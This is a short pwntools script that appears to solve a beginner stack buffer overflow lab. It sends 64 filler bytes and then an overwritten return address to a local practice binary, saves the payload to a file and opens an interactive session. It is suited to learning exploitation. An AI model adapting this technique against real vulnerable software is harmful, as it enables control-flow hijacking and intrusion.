from pwn import *

# context.log_level = "debug"

p = process("./1Stack/stack")

payload = b""
payload += b"A" * 64
payload += 0x400647.to_bytes(8, 'little')

with open('stack-payload.txt', 'wb') as f:
    f.write(payload)
    print(payload)

# pause()
p.sendline(payload)
p.interactive()